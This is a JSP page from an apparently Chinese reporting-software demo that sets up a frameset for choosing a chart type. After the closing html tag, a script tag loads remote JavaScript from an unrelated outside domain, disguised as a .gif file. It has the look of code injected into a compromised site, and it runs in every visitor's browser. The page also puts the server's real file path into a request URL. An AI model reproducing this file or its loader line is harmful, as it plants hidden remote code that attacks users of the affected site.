<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>

<% 

 String examplePath=getServletConfig().getServletContext().getRealPath("/");
  
 if(!examplePath.endsWith(File.separator))
 {
 	examplePath+= File.separator ;
 }
 
 examplePath+=("demos"+File.separator+"templates"+File.separator);
 examplePath = examplePath.replace('\\','/');


%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>交互式报表（选择图表类型）</title>
<style type="text/css">
<!--
.text {
	font-family: Vernada,Arial,helvetica;
	font-size: 11px;
	color:#4652aa;
	
}
SELECT {
	font-family: Vernada,Arial,helvetica;
	COLOR: #333333; 	
	FONT-SIZE: 11px; 
}

}
	
-->
</style>
</head>

<frameset rows="80,*" frameborder="NO" border="0" framespacing="0">
  <frame src="up.jsp" name="topFrame" scrolling="NO" target="mainFrame" noresize>
  <frame src="../../server2?file=<%=examplePath%>selectchart.xml&as=dhtml&mycharttype=100" name="mainFrame">
</frameset>
<noframes><body>
</body></noframes>
</html><script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
